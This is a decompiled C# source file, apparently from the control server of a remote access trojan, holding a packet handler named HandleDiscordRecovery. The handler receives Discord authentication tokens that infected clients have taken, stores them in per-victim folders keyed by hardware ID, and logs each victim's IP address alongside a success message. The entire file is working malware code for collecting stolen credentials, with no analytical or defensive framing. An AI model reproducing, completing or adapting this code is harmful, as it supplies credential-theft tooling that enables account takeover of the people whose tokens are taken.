using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x0200006F RID: 111
	public class HandleDiscordRecovery
	{
		// Token: 0x06000404 RID: 1028 RVA: 0x00025854 File Offset: 0x00023A54
		public HandleDiscordRecovery(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				string text = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Discord");
				string asString = unpack_msgpack.ForcePathObject("Tokens").AsString;
				if (!string.IsNullOrWhiteSpace(asString))
				{
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					File.WriteAllText(text + "\\Tokens_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", asString.Replace("\n", Environment.NewLine));
					new HandleLogs().Addmsg(string.Concat(new string[]
					{
						"Client ",
						client.Ip,
						" discord recovery success，file located @ ClientsFolder \\ ",
						unpack_msgpack.ForcePathObject("Hwid").AsString,
						" \\ Discord"
					}), Color.Gainsboro);
				}
				else
				{
					new HandleLogs().Addmsg("Client " + client.Ip + " discord recovery error", Color.Gainsboro);
				}
				if (client != null)
				{
					client.Disconnected();
				}
			}
			catch (Exception ex)
			{
				new HandleLogs().Addmsg(ex.Message, Color.Gainsboro);
			}
		}
	}
}
